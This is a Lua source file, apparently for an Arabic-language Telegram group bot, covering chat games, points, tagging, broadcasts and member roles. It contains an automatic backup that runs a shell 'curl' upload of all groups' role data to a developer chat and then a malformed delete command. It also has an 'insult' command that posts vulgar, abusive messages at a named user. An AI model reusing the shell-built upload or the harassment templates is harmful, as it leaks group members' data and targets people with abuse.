name = DevRio2[math.random(#DevRio2)]
DevRio:set(ARAY..'Rio:GameNum4'..msg.chat_id_,name)
DevRio:del(ARAY..'Rio:Games:Ids'..msg.chat_id_)
name = string.gsub(name,'😸','😹😹😹😸😹😹😹😹')
name = string.gsub(name,'☠️','💀💀💀☠️💀💀💀💀')
name = string.gsub(name,'🐼','👻👻👻👻👻👻👻🐼')
...
name = string.gsub(name,'👩‍⚖️','👨‍⚖️👨‍⚖️👨‍⚖️👨‍⚖️👨‍⚖️👩‍⚖️👨‍⚖️👨‍⚖️')
name = string.gsub(name,'👨‍🎨','👩‍🎨👩‍🎨👨‍🎨👩‍🎨👩‍🎨👩‍🎨👩‍🎨👩‍🎨')
ARAYTeam = '↯︙اول واحد يطلع المختلف يربح\n{'..name..'} '
Dev_Rio(msg.chat_id_, msg.id_, 1,ARAYTeam, 1, 'md')
return false
end end
if text == DevRio:get(ARAY..'Rio:GameNum4'..msg.chat_id_) and not DevRio:get(ARAY..'Rio:Games:Ids'..msg.chat_id_) then
if not DevRio:get(ARAY..'Rio:Games:Ids'..msg.chat_id_) then 
...
name = DevRio2[math.random(#DevRio2)]
DevRio:set(ARAY..'Rio:GameNum5'..msg.chat_id_,name)
DevRio:del(ARAY..'Rio:Games:Ids'..msg.chat_id_)
...
ARAYTeam = '↯︙اكمل المثال التالي ↫ ['..name..']'
Dev_Rio(msg.chat_id_, msg.id_, 1,ARAYTeam, 1, 'md')
return false
end end
if text == DevRio:get(ARAY..'Rio:GameNum5'..msg.chat_id_) then
if not DevRio:get(ARAY..'Rio:Games:Ids'..msg.chat_id_) then 
DevRio:incrby(ARAY..'Rio:GamesNumber'..msg.chat_id_..msg.sender_user_id_, 1)  
DevRio:del(ARAY..'Rio:GameNum5'..msg.chat_id_)
...
name = DevRio2[math.random(#DevRio2)]
DevRio:set(ARAY..'Rio:GameNum6'..msg.chat_id_,name)
DevRio:del(ARAY..'Rio:Games:Ids'..msg.chat_id_)
...
ARAYTeam = '↯︙اكمل المعادله التاليه ↫ ⤈\n{'..name..'} '
Dev_Rio(msg.chat_id_, msg.id_, 1,ARAYTeam, 1, 'md')
return false
end end
if text == DevRio:get(ARAY..'Rio:GameNum6'..msg.chat_id_) then
if not DevRio:get(ARAY..'Rio:Games:Ids'..msg.chat_id_) then 
DevRio:incrby(ARAY..'Rio:GamesNumber'..msg.chat_id_..msg.sender_user_id_, 1)  
DevRio:del(ARAY..'Rio:GameNum6'..msg.chat_id_)
...
name = DevRio2[math.random(#DevRio2)]
DevRio:set(ARAY..'Rio:GameNum7'..msg.chat_id_,name)
DevRio:del(ARAY..'Rio:Games:Ids'..msg.chat_id_)
...
ARAYTeam = '↯︙ما معنى كلمة ↫ '..name
Dev_Rio(msg.chat_id_, msg.id_, 1,ARAYTeam, 1, 'md')
return false
end end
if text == DevRio:get(ARAY..'Rio:GameNum7'..msg.chat_id_) then
if not DevRio:get(ARAY..'Rio:Games:Ids'..msg.chat_id_) then 
DevRio:incrby(ARAY..'Rio:GamesNumber'..msg.chat_id_..msg.sender_user_id_, 1)  
DevRio:del(ARAY..'Rio:GameNum7'..msg.chat_id_)
...
name = DevRio2[math.random(#DevRio2)]
DevRio:set(ARAY..'Rio:GameNum8'..msg.chat_id_,name)
DevRio:del(ARAY..'Rio:Games:Ids'..msg.chat_id_)
...
if text == DevRio:get(ARAY..'Rio:GameNum8'..msg.chat_id_) then
if not DevRio:get(ARAY..'Rio:Games:Ids'..msg.chat_id_) then 
DevRio:incrby(ARAY..'Rio:GamesNumber'..msg.chat_id_..msg.sender_user_id_, 1)  
DevRio:del(ARAY..'Rio:GameNum8'..msg.chat_id_)
...
--     Source ARAY     --
if DevRio:get(ARAY.."GAME:TKMEN"..msg.chat_id_.."" .. msg.sender_user_id_) then  
if text and text:match("^(%d+)$") then
local NUM = text:match("^(%d+)$")
if tonumber(NUM) > 20 then
Dev_Rio(msg.chat_id_, msg.id_, 1,"↯︙عذرا لا يمكنك تخمين عدد اكبر من الـ20 خمن رقم ما بين الـ1 والـ20", 1, 'md')
return false  end 
local GETNUM = DevRio:get(ARAY.."GAMES:NUM"..msg.chat_id_)
if tonumber(NUM) == tonumber(GETNUM) then
DevRio:del(ARAY..'Set:Num'..msg.chat_id_..msg.sender_user_id_)
DevRio:del(ARAY.."GAME:TKMEN"..msg.chat_id_.."" .. msg.sender_user_id_)   
DevRio:incrby(ARAY..'Rio:GamesNumber'..msg.chat_id_..msg.sender_user_id_,5)  
Dev_Rio(msg.chat_id_, msg.id_, 1,'↯︙*التخمين الصحيح هو* ↫ '..NUM..'\n↯︙*مبروك لقد ربحت وحصلت على 5 نقاط يمكنك استبدالها بالرسائل*', 1, 'md')
elseif tonumber(NUM) ~= tonumber(GETNUM) then
DevRio:incrby(ARAY..'Set:Num'..msg.chat_id_..msg.sender_user_id_,1)
if tonumber(DevRio:get(ARAY..'Set:Num'..msg.chat_id_..msg.sender_user_id_)) >= 3 then
DevRio:del(ARAY..'Set:Num'..msg.chat_id_..msg.sender_user_id_)
DevRio:del(ARAY.."GAME:TKMEN"..msg.chat_id_.."" .. msg.sender_user_id_)   
Dev_Rio(msg.chat_id_, msg.id_, 1,'↯︙*التخمين الصحيح هو* ↫ '..GETNUM..'\n↯︙*للاسف لقد خسرت حاول مره اخرى لتخمين الرقم الصحيح*', 1, 'md')
else
if tonumber(DevRio:get(ARAY..'Set:Num'..msg.chat_id_..msg.sender_user_id_)) == 1 then
SetNum = 'محاولتان فقط'
elseif tonumber(DevRio:get(ARAY..'Set:Num'..msg.chat_id_..msg.sender_user_id_)) == 2 then
...
DevRio:set(ARAY.."GAMES:NUM"..msg.chat_id_,Num) 
Dev_Rio(msg.chat_id_, msg.id_, 1,'↯︙اهلا بك عزيزي في لعبة التخمين ↫ ⤈\n ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉\n↯︙سيتم تخمين عدد ما بين الـ1 والـ20 اذا تعتقد انك تستطيع الفوز جرب واللعب الان .\n↯︙ملاحظه لديك ثلاث محاولات فقط فكر قبل ارسال تخمينك !', 1, 'md')
DevRio:setex(ARAY.."GAME:TKMEN"..msg.chat_id_.."" .. msg.sender_user_id_, 100, true)  
return false  
end
end
--     Source ARAY     --
...
if not DevRio:get(ARAY..'Rio:Lock:Games'..msg.chat_id_) then
DevRio:del(ARAY.."Rio:NumRolet"..msg.chat_id_..msg.sender_user_id_) 
DevRio:del(ARAY..'Rio:ListRolet'..msg.chat_id_)  
DevRio:setex(ARAY.."Rio:StartRolet"..msg.chat_id_..msg.sender_user_id_,3600,true)  
Dev_Rio(msg.chat_id_, msg.id_, 1, '↯︙حسنا لنلعب , ارسل عدد اللاعبين للروليت .', 1, 'md')
return false  
end
end
if text and text:match("^(%d+)$") and DevRio:get(ARAY.."Rio:StartRolet"..msg.chat_id_..msg.sender_user_id_) then
if text == "1" then
Text = "↯︙لا استطيع بدء اللعبه بلاعب واحد فقط"
else
DevRio:set(ARAY.."Rio:NumRolet"..msg.chat_id_..msg.sender_user_id_,text)  
Text = '↯︙تم بدء تسجيل اللسته يرجى ارسال المعرفات \n↯︙الفائز يحصل على 5 نقاط عدد المطلوبين ↫ '..text..' لاعب'
end
DevRio:del(ARAY.."Rio:StartRolet"..msg.chat_id_..msg.sender_user_id_)
send(msg.chat_id_,msg.id_,Text)
return false
end
if text and text:match('^(@[%a%d_]+)$') and DevRio:get(ARAY.."Rio:NumRolet"..msg.chat_id_..msg.sender_user_id_) then 
if DevRio:sismember(ARAY..'Rio:ListRolet'..msg.chat_id_,text) then
...
DevRio:sadd(ARAY..'Rio:ListRolet'..msg.chat_id_,text)
local CountAdd = DevRio:get(ARAY.."Rio:NumRolet"..msg.chat_id_..msg.sender_user_id_)
local CountAll = DevRio:scard(ARAY..'Rio:ListRolet'..msg.chat_id_)
local CountUser = CountAdd - CountAll
if tonumber(CountAll) == tonumber(CountAdd) then 
DevRio:del(ARAY.."Rio:NumRolet"..msg.chat_id_..msg.sender_user_id_) 
DevRio:setex(ARAY.."Rio:WittingStartRolet"..msg.chat_id_..msg.sender_user_id_,1400,true) 
...
DevRio0 = (DevRio:get(ARAY..'Rio:GamesNumber'..msg.chat_id_..msg.sender_user_id_) * 50)
DevRio:incrby(ARAY..'Rio:UsersMsgs'..msg.chat_id_..':'..msg.sender_user_id_,DevRio0)
Dev_Rio(msg.chat_id_, msg.id_, 1,'↯︙تم بيع '..(DevRio:get(ARAY..'Rio:GamesNumber'..msg.chat_id_..msg.sender_user_id_))..' من نقاطك\n↯︙كل نقطه تساوي 50 رساله', 'md')
DevRio:del(ARAY..'Rio:GamesNumber'..msg.chat_id_..msg.sender_user_id_)
end
end
--     Source ARAY     --
...
DevRio:sadd(ARAY..'Rio:BasicConstructor:'..msg.chat_id_,Manager_id)  
DevRio:sadd(ARAY..'Rio:RioConstructor:'..msg.chat_id_,Manager_id)   
end  
end  
if num == 0 then
...
if DevRio:get(ARAY.."Rio:Left:Bot"..ARAY) then
...
local msguser = tonumber(DevRio:get(ARAY..'Rio:UsersMsgs'..msg.chat_id_..':'..msg.sender_user_id_))
local user_msgs = DevRio:get(ARAY..'Rio:UsersMsgs'..msg.chat_id_..':'..msg.sender_user_id_)
local cont = (tonumber(DevRio:get(ARAY..'Rio:ContactNumber'..msg.chat_id_..':'..msg.sender_user_id_)) or 0)
local user_nkt = tonumber(DevRio:get(ARAY..'Rio:GamesNumber'..msg.chat_id_..msg.sender_user_id_) or 0)
if result.username_ then username = '@'..result.username_ else username = 'لا يوجد' end
...
DevRio:setex(ARAY..'DevRio4'..msg.sender_user_id_,360,true)
...
function ARAYTeam(extra,result,success)
if DevRio:get(ARAY.."Rio:Send:Bot"..ARAY) and not RioSudo(msg) then 
send(msg.chat_id_, msg.id_,"↯︙الاذاعه معطله من قبل المطور الاساسي")
return false
end
local GpList = DevRio:smembers(ARAY.."Rio:Groups")
for k,v in pairs(GpList) do
tdcli_function({ID="ForwardMessages", chat_id_ = v, from_chat_id_ = msg.chat_id_, message_ids_ = {[0] = result.id_}, disable_notification_ = 0, from_background_ = 1},function(a,t) end,nil) 
end
local PvList = DevRio:smembers(ARAY.."Rio:Users")
for k,v in pairs(PvList) do
tdcli_function({ID="ForwardMessages", chat_id_ = v, from_chat_id_ = msg.chat_id_, message_ids_ = {[0] = result.id_}, disable_notification_ = 0, from_background_ = 1},function(a,t) end,nil) 
end
Dev_Rio(msg.chat_id_, msg.id_, 1, '↯︙تم اذاعة رسالتك بالتوجيه \n↯︙‏في ↫ ❨ '..#GpList..' ❩ مجموعه \n↯︙والى ↫ ❨ '..#PvList..' ❩ مشترك \n ✓', 1, 'md')
end
getMessage(msg.chat_id_, tonumber(msg.reply_to_message_id_),ARAYTeam)
end
end
--     Source ARAY     --
if text == "مشاهده المنشور" and ChCheck(msg) or text == "مشاهدات المنشور" and ChCheck(msg) or text == "عدد المشاهدات" and ChCheck(msg) then
DevRio:set(ARAY..'Rio:viewget'..msg.sender_user_id_,true)
...
Text = [[
Welcome To Source
↯︙[ARAY Team](https://t.me/sxj3z)
]]
keyboard = {} 
keyboard.inline_keyboard = {{{text = '᥀ Source Channel',url="https://t.me/sxj3z"}},{{text = '᥀ Developer',url="t.me/BH_U1"}}}
local msg_id = msg.id_/2097152/0.5
https.request("https://api.telegram.org/bot"..TokenBot..'/sendPhoto?chat_id=' .. msg.chat_id_ .. '&photo=https://t.me/sxj3z&caption=' .. URL.escape(Text).."&reply_to_message_id="..msg_id.."&parse_mode=markdown&disable_web_page_preview=true&reply_markup="..JSON.encode(keyboard))
return false
end
...
if DevRio:get(ARAY.."Rio:Kick:Me"..msg.chat_id_) then
Dev_Rio(msg.chat_id_, msg.id_, 1, '↯︙عذرا هذه الخاصيه معطله ', 1, 'md')
return false
end
DevRio:set(ARAY..'yes'..msg.sender_user_id_, 'delyes')
DevRio:set(ARAY..'no'..msg.sender_user_id_, 'delno')
...
DevRio:set(ARAY.."Rio:Kick:Me"..msg.chat_id_, true)
local ARAYTeam = '↯︙اهلا عزيزي ↫ '..RioRank(msg)..' \n↯︙تم تعطيل امر اطردني'
riomoned(msg.chat_id_, msg.sender_user_id_, msg.id_, ARAYTeam, 14, string.len(msg.sender_user_id_))
end
if text == 'تفعيل اطردني' and Manager(msg) and ChCheck(msg) then
DevRio:del(ARAY.."Rio:Kick:Me"..msg.chat_id_)
local ARAYTeam = '↯︙اهلا عزيزي ↫ '..RioRank(msg)..' \n↯︙تم تفعيل امر اطردني'
riomoned(msg.chat_id_, msg.sender_user_id_, msg.id_, ARAYTeam, 14, string.len(msg.sender_user_id_))
end
--     Source ARAY     --
if text == "نزلني" and ChCheck(msg) then
if DevRio:get(ARAY.."Rio:Del:Me"..msg.chat_id_) then
Dev_Rio(msg.chat_id_, msg.id_, 1, '↯︙عذرا هذه الخاصيه معطله ', 1, 'md')
return false
end
DevRio:set(ARAY..'yesdel'..msg.sender_user_id_, 'delyes')
DevRio:set(ARAY..'nodel'..msg.sender_user_id_, 'delno')
...
DevRio:set(ARAY.."Rio:Del:Me"..msg.chat_id_, true)
local ARAYTeam = '↯︙اهلا عزيزي ↫ '..RioRank(msg)..' \n↯︙تم تعطيل امر نزلني'
riomoned(msg.chat_id_, msg.sender_user_id_, msg.id_, ARAYTeam, 14, string.len(msg.sender_user_id_))
end
if text == 'تفعيل نزلني' and BasicConstructor(msg) and ChCheck(msg) then
DevRio:del(ARAY.."Rio:Del:Me"..msg.chat_id_)
local ARAYTeam = '↯︙اهلا عزيزي ↫ '..RioRank(msg)..' \n↯︙تم تفعيل امر نزلني'
riomoned(msg.chat_id_, msg.sender_user_id_, msg.id_, ARAYTeam, 14, string.len(msg.sender_user_id_))
end
--     Source ARAY     --
...
riomoned(msg.chat_id_, msg.sender_user_id_, msg.id_, ARAYTeam, 14, string.len(msg.sender_user_id_))
DevRio:del(ARAY..'Rio:Lock:TagAll'..msg.chat_id_)
end
...
riomoned(msg.chat_id_, msg.sender_user_id_, msg.id_, ARAYTeam, 14, string.len(msg.sender_user_id_))
DevRio:set(ARAY..'Rio:Lock:TagAll'..msg.chat_id_,true)
end
if Admin(msg) then
if text == "تاك للكل" and ChCheck(msg) then
if not DevRio:get(ARAY..'Rio:Lock:TagAll'..msg.chat_id_) then
function TagAll(dp1,dp2)
local text = "↯︙وينكم يالربع \n┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉\n"
i = 0
for k, v in pairs(dp2.members_) do
i = i + 1
if DevRio:get(ARAY..'Save:UserName'..v.user_id_) then
text = text..i.."~ : [@"..DevRio:get(ARAY..'Save:UserName'..v.user_id_).."]\n"
else
...
riomoned(msg.chat_id_, msg.sender_user_id_, msg.id_, ARAYTeam, 14, string.len(msg.sender_user_id_))
DevRio:del(ARAY.."Rio:Lock:TagAll")
end
if text == 'تعطيل ملف TagAll.lua' or text == 'تعطيل @all' or text == 'تعطيل all' or text == '↫ تعطيل all ᥀' then   
local ARAYTeam = '↯︙اهلا عزيزي ↫ '..RioRank(msg)..' \n↯︙تم تعطيل ملف تاك منفصل للأعضاء'
riomoned(msg.chat_id_, msg.sender_user_id_, msg.id_, ARAYTeam, 14, string.len(msg.sender_user_id_))
DevRio:set(ARAY.."Rio:Lock:TagAll",true) 
end 
if text and (text == "all" or text == "@all" or text == "#all") then
if (text and not DevRio:get(ARAY.."Rio:Lock:TagAll")) then
if DevRio:get(ARAY.."Rio:TagAll:Time"..msg.chat_id_..':'..msg.sender_user_id_) then  
Dev_Rio(msg.chat_id_, msg.id_, 1, '↯︙انتظر دقيقه بعد ارسال الامر', 1, 'md')
return false  
end
DevRio:setex(ARAY..'Rio:TagAll:Time'..msg.chat_id_..':'..msg.sender_user_id_,300,true)
tdcli_function({ID="GetChannelFull",channel_id_ = msg.chat_id_:gsub('-100','')},function(arg,data) 
...
riomoned(msg.chat_id_, msg.sender_user_id_, msg.id_, ARAYTeam, 14, string.len(msg.sender_user_id_))
DevRio:del(ARAY.."Rio:Lock:TagAdmins")
end
if text == 'تعطيل @admin' or text == 'تعطيل admin' or text == '↫ تعطيل admin ᥀' then   
local ARAYTeam = '↯︙اهلا عزيزي ↫ '..RioRank(msg)..' \n↯︙تم تعطيل ملف تاك منفصل للمشرفين'
riomoned(msg.chat_id_, msg.sender_user_id_, msg.id_, ARAYTeam, 14, string.len(msg.sender_user_id_))
DevRio:set(ARAY.."Rio:Lock:TagAdmins",true) 
end 
if text == "admin" or text == "@admin" or text == "#admin" then
if (text and not DevRio:get(ARAY.."Rio:Lock:TagAdmins")) then
if DevRio:get(ARAY.."Rio:TagAdmins:Time"..msg.chat_id_..':'..msg.sender_user_id_) then  
Dev_Rio(msg.chat_id_, msg.id_, 1, '↯︙انتظر دقيقه بعد ارسال الامر', 1, 'md')
return false  
end
DevRio:setex(ARAY..'Rio:TagAdmins:Time'..msg.chat_id_..':'..msg.sender_user_id_,300,true)
...
--     Source ARAY     --
if (text and not DevRio:get(ARAY.."Rio:Lock:AutoFile")) then
Time = DevRio:get(ARAY.."Rio:AutoFile:Time")
if Time then 
...
Welcomes = DevRio:get(ARAY..'Rio:Groups:Welcomes'..v) or ''
RioConstructors = DevRio:smembers(ARAY..'Rio:RioConstructor:'..v)
BasicConstructors = DevRio:smembers(ARAY..'Rio:BasicConstructor:'..v)
Constructors = DevRio:smembers(ARAY..'Rio:Constructor:'..v)
Managers = DevRio:smembers(ARAY..'Rio:Managers:'..v)
Admis = DevRio:smembers(ARAY..'Rio:Admins:'..v)
Vips = DevRio:smembers(ARAY..'Rio:VipMem:'..v)
if k == 1 then
...
local curl = 'curl "' .. Rio .. '" -F "chat_id='..DevId..'" -F "document=@'..ARAY..'.json' .. '" -F "caption=↯︙نسخه تلقائيه تحتوي على ↫ '..#list..' مجموعه"'
io.popen(curl)
io.popen('fm -fr '..ARAY..'.json')
DevRio:set(ARAY.."Rio:AutoFile:Time",os.date("%x"))
end
else 
DevRio:set(ARAY.."Rio:AutoFile:Time",os.date("%x"))
end
...
local EntryNumber = (DevRio:get(ARAY..'Rio:EntryNumber'..msg.chat_id_..':'..os.date('%d')) or 0)
local ExitNumber = (DevRio:get(ARAY..'Rio:ExitNumber'..msg.chat_id_..':'..os.date('%d')) or 0)
local MsgNumberDay = (DevRio:get(ARAY..'Rio:MsgNumberDay'..msg.chat_id_..':'..os.date('%d')) or 0)
...
local ARAYTeam = '↯︙اهلا عزيزي ↫ '..RioRank(msg)..' \n↯︙تم تعطيل تفاعلي'
riomoned(msg.chat_id_, msg.sender_user_id_, msg.id_, ARAYTeam, 14, string.len(msg.sender_user_id_))
DevRio:del(ARAY..'Rio:msg:Rio'..msg.chat_id_) 
end
if text == "تفعيل تفاعلي" and Manager(msg) and ChCheck(msg) then
local ARAYTeam = '↯︙اهلا عزيزي ↫ '..RioRank(msg)..' \n↯︙تم تفعيل تفاعلي'
riomoned(msg.chat_id_, msg.sender_user_id_, msg.id_, ARAYTeam, 14, string.len(msg.sender_user_id_))
DevRio:set(ARAY..'Rio:msg:Rio'..msg.chat_id_,true)  
end
if DevRio:get(ARAY.."Rio:msg:Rio"..msg.chat_id_) then
if msg.content_.ID then
get_msg = DevRio:get(ARAY.."Rio:msg:Rio"..msg.sender_user_id_..":"..msg.chat_id_) or 0
gms = get_msg + 1
DevRio:setex(ARAY..'Rio:msg:Rio'..msg.sender_user_id_..":"..msg.chat_id_,86400,gms)
end
...
get_msg = DevRio:get(ARAY.."Rio:msg:Rio"..result.sender_user_id_..":"..msg.chat_id_) or 0
...
--     Source ARAY     --
if text == "جهاتي" and ChCheck(msg) or text == "اضافاتي" and ChCheck(msg) then add = (tonumber(DevRio:get(ARAY..'Rio:ContactNumber'..msg.chat_id_..':'..msg.sender_user_id_)) or 0) Dev_Rio(msg.chat_id_, msg.id_, 1, "↯︙عدد جهاتك المضافه ↫ *❨ "..add.." ❩* ", 1, 'md') end
if text == "تعديلاتي" or text == "سحكاتي" and ChCheck(msg) then local edit_msg = DevRio:get(ARAY..'Rio:EditMsg'..msg.chat_id_..msg.sender_user_id_) or 0  Dev_Rio(msg.chat_id_, msg.id_, 1, "↯︙عدد تعديلاتك ↫ *❨ "..edit_msg.." ❩* ", 1, 'md') end
...
if text == 'مسح سحكاتي' or text == 'مسح تعديلاتي' or text == 'حذف سحكاتي' or text == 'حذف تعديلاتي' then DevRio:del(ARAY..'Rio:EditMsg'..msg.chat_id_..msg.sender_user_id_) Dev_Rio(msg.chat_id_, msg.id_, 1, '↯︙تم حذف جميع تعديلاتك بنجاح' , 1, 'md') end
if text == 'مسح جهاتي' or text == 'مسح اضافاتي' or text == 'حذف جهاتي' or text == 'حذف اضافاتي' then DevRio:del(ARAY..'Rio:ContactNumber'..msg.chat_id_..':'..msg.sender_user_id_) Dev_Rio(msg.chat_id_, msg.id_, 1, '↯︙تم حذف جميع جهاتك المضافه' , 1, 'md') end
--     Source ARAY     --
if text and text:match('^هينه @(.*)') and ChCheck(msg) or text and text:match('^هينها @(.*)') and ChCheck(msg) then 
if not DevRio:get(ARAY..'Rio:Lock:Stupid'..msg.chat_id_) then
local username = text:match('^هينه @(.*)') or text:match('^هينها @(.*)') 
function ARAYTeam(extra,result,success)
if result.id_ then  
if tonumber(result.id_) == tonumber(ARAY) then  
...
if tonumber(result.id_) == tonumber(1692631901) then 
Dev_Rio(msg.chat_id_, msg.id_, 1, 'دي لكك تريد اهينن تاج راسكك؟😏🖕🏿', 1, 'md') 
return false  
end  
if DevRio:sismember(ARAY.."Rio:RioConstructor:"..msg.chat_id_,result.id_) then
Dev_Rio(msg.chat_id_, msg.id_, 1, 'دي لكك تريد اهينن تاج راسكك؟😏🖕🏿', 1, 'md')
return false
end 
local ARAYTeam = "صارر ستاذيي 🏃🏻‍♂️♥️" 
Dev_Rio(msg.chat_id_, msg.id_, 1,ARAYTeam, 1, 'md') 
local ARAYTeam = { "لكك جرجف @"..username.." احترم اسيادكك لا اكتلكك وازربب على كبركك،💩🖐🏿","هشش لكك فاشل @"..username.." لتضل تمسلت لا اخربط تضاريس وجهك جنه ابط عبده، 😖👌🏿","حبيبي @"..username.." راح احاول احترمكك هالمره بلكي تبطل حيونه، 🤔🔪","دمشي لك @"..username.." ينبوع الفشل مو زين ملفيك ونحجي وياك هي منبوذ 😏🖕🏿","ها الغليض التفس ابو راس المربع @"..username.." متعلملك جم حجايه وجاي تطكطكهن علينه دبطل😒🔪",}
Dev_Rio(msg.chat_id_, result.id_, 1,''..ARAYTeam[math.random(#ARAYTeam)], 1, 'html') 
else  
Dev_Rio(msg.chat_id_, msg.id_, 1, '↯︙العضو غير موجود في المجموعه', 1, 'md') 
end 
end 
resolve_username(username,ARAYTeam)
end
end
--     Source ARAY     --
...
if tonumber(result.sender_user_id_) == tonumber(ARAY) then 
Dev_Rio(msg.chat_id_, msg.id_, 1, 'شو تمضرط اكو واحد يهين نفسه؟🤔👌🏿', 1, 'md') 
return false  
end  
...
if tonumber(result.sender_user_id_) == tonumber(1692631901) then  
Dev_Rio(msg.chat_id_, msg.id_, 1, 'دي لكك تريد اهينن تاج راسكك؟😏🖕🏿', 1, 'md')
return false
end 
if DevRio:sismember(ARAY.."Rio:RioConstructor:"..msg.chat_id_,result.sender_user_id_) then
Dev_Rio(msg.chat_id_, msg.id_, 1, 'دي لكك تريد اهينن تاج راسكك؟😏🖕🏿', 1, 'md')
return false
end 
local ARAYTeam = "صارر ستاذيي 🏃🏻‍♂️♥️" 
Dev_Rio(msg.chat_id_, msg.id_, 1,ARAYTeam, 1, 'md') 
local ARAYTeam = {"لكك جرجف احترم اسيادكك لا اكتلكك وازربب على كبركك،💩🖐🏿","هشش فاشل لتضل تمسلت لا اخربط تضاريس وجهك جنه ابط عبده، 😖👌🏿","دمشي لك ينبوع الفشل مو زين ملفيك ونحجي وياك هي منبوذ 😏🖕🏿","ها الغليض التفس ابو راس المربع متعلملك جم حجايه وجاي تطكطكهن علينه دبطل😒🔪","حبيبي راح احاول احترمكك هالمره بلكي تبطل حيونه، 🤔🔪"} 
Dev_Rio(msg.chat_id_, result.id_, 1,''..ARAYTeam[math.random(#ARAYTeam)], 1, 'md') 
end 
if tonumber(msg.reply_to_message_id_) == 0 then
else 
...
local ARAYTeam = "صارر ستاذيي 🏃🏻‍♂️♥️" 
Dev_Rio(msg.chat_id_, msg.id_, 1,ARAYTeam, 1, 'md') 
local ARAYTeam = {"مواححح افيش عافيههه😍🔥💗","امممووااهحح شهلعسل🥺🍯💘","مواححح،ءوفف اذوب🤤💗"} 
Dev_Rio(msg.chat_id_, result.id_, 1,''..ARAYTeam[math.random(#ARAYTeam)], 1, 'md') 
end 
if tonumber(msg.reply_to_message_id_) == 0 then
else 
...
local ARAYTeam = "صارر ستاذيي 🏃🏻‍♂️♥️" 
Dev_Rio(msg.chat_id_, msg.id_, 1,ARAYTeam, 1, 'md') 
local ARAYTeam = {"تتعال ححب محتاجيك🙂🍭","تعال يولل استاذكك ايريدككك😒🔪","يمعوود تعاال يريدوكك🤕♥️","تعال لكك ديصيحوك😐🖤"} 
Dev_Rio(msg.chat_id_, result.id_, 1,''..ARAYTeam[math.random(#ARAYTeam)], 1, 'md') 
end 
if tonumber(msg.reply_to_message_id_) == 0 then
else 
...
local ARAYTeam = "صارر ستاذيي 🏃🏻‍♂️♥️" 
Dev_Rio(msg.chat_id_, msg.id_, 1,ARAYTeam, 1, 'md') 
local ARAYTeam = { "تتعال ححب @"..username.." محتاجيك🙂🍭","تعال يولل @"..username.." استاذكك ايريدككك😒🔪","يمعوود @"..username.." تعاال يريدوكك🤕♥️","تعال لكك @"..username.." ديصيحوك😐🖤",}
Dev_Rio(msg.chat_id_, result.id_, 1,''..ARAYTeam[math.random(#ARAYTeam)], 1, 'html') 
else  
Dev_Rio(msg.chat_id_, msg.id_, 1, '↯︙العضو غير موجود في المجموعه', 1, 'md') 
end 
...
if DevRio:sismember(ARAY..'Rio:RioSudo:',result.sender_user_id_) then
riosudo = 'المطورين الاساسيين • ' else riosudo = '' end
if DevRio:sismember(ARAY..'Rio:SecondSudo:',result.sender_user_id_) then
secondsudo = 'المطورين الثانويين • ' else secondsudo = '' end
if DevRio:sismember(ARAY..'Rio:SudoBot:',result.sender_user_id_) then
sudobot = 'المطورين • ' else sudobot = '' end
if DevRio:sismember(ARAY..'Rio:BasicConstructor:'..msg.chat_id_, result.sender_user_id_) then
basicconstructor = 'المنشئين الاساسيين • ' else basicconstructor = '' end
if DevRio:sismember(ARAY..'Rio:Constructor:'..msg.chat_id_, result.sender_user_id_) then
constructor = 'المنشئين • ' else constructor = '' end 
if DevRio:sismember(ARAY..'Rio:Managers:'..msg.chat_id_, result.sender_user_id_) then
manager = 'المدراء • ' else manager = '' end
if DevRio:sismember(ARAY..'Rio:Admins:'..msg.chat_id_, result.sender_user_id_) then
admins = 'الادمنيه • ' else admins = '' end
if DevRio:sismember(ARAY..'Rio:VipMem:'..msg.chat_id_, result.sender_user_id_) then
vipmem = 'المميزين • ' else vipmem = '' end
if DevRio:sismember(ARAY..'Rio:Cleaner:'..msg.chat_id_, result.sender_user_id_) then
...
DevRio:srem(ARAY..'Rio:RioSudo:', result.sender_user_id_)
DevRio:srem(ARAY..'Rio:SecondSudo:', result.sender_user_id_)
DevRio:srem(ARAY..'Rio:SudoBot:', result.sender_user_id_)
DevRio:srem(ARAY..'Rio:BasicConstructor:'..msg.chat_id_,result.sender_user_id_)
DevRio:srem(ARAY..'Rio:Constructor:'..msg.chat_id_,result.sender_user_id_)
DevRio:srem(ARAY..'Rio:Managers:'..msg.chat_id_, result.sender_user_id_)
DevRio:srem(ARAY..'Rio:Admins:'..msg.chat_id_, result.sender_user_id_)
DevRio:srem(ARAY..'Rio:VipMem:'..msg.chat_id_, result.sender_user_id_)
DevRio:srem(ARAY..'Rio:Cleaner:'..msg.chat_id_, result.sender_user_id_)
...
if DevRio:sismember(ARAY..'Rio:RioSudo:',result.id_) then
Riosudo = 'المطورين الاساسيين • ' else Riosudo = '' end
if DevRio:sismember(ARAY..'Rio:SecondSudo:',result.id_) then
secondsudo = 'المطورين الثانويين • ' else secondsudo = '' end
if DevRio:sismember(ARAY..'Rio:SudoBot:',result.id_) then
sudobot = 'المطورين • ' else sudobot = '' end
if DevRio:sismember(ARAY..'Rio:BasicConstructor:'..msg.chat_id_, result.id_) then
basicconstructor = 'المنشئين الاساسيين • ' else basicconstructor = '' end
if DevRio:sismember(ARAY..'Rio:Constructor:'..msg.chat_id_, result.id_) then
constructor = 'المنشئين • ' else constructor = '' end 
if DevRio:sismember(ARAY..'Rio:Managers:'..msg.chat_id_, result.id_) then
manager = 'المدراء • ' else manager = '' end
if DevRio:sismember(ARAY..'Rio:Admins:'..msg.chat_id_, result.id_) then
admins = 'الادمنيه • ' else admins = '' end
if DevRio:sismember(ARAY..'Rio:VipMem:'..msg.chat_id_, result.id_) then
vipmem = 'المميزين • ' else vipmem = '' end
if DevRio:sismember(ARAY..'Rio:Cleaner:'..msg.chat_id_, result.id_) then
cleaner = 'المنظفين • ' else cleaner = ''
end
...
if RioDelAll(msg.sender_user_id_,msg.chat_id_) == 'sudoid' then
DevRio:srem(ARAY..'Rio:RioSudo:', result.id_)
DevRio:srem(ARAY..'Rio:SecondSudo:', result.id_)
DevRio:srem(ARAY..'Rio:SudoBot:', result.id_)
DevRio:srem(ARAY..'Rio:BasicConstructor:'..msg.chat_id_,result.id_)
DevRio:srem(ARAY..'Rio:Constructor:'..msg.chat_id_,result.id_)
DevRio:srem(ARAY..'Rio:Managers:'..msg.chat_id_, result.id_)
DevRio:srem(ARAY..'Rio:Admins:'..msg.chat_id_, result.id_)
DevRio:srem(ARAY..'Rio:VipMem:'..msg.chat_id_, result.id_)
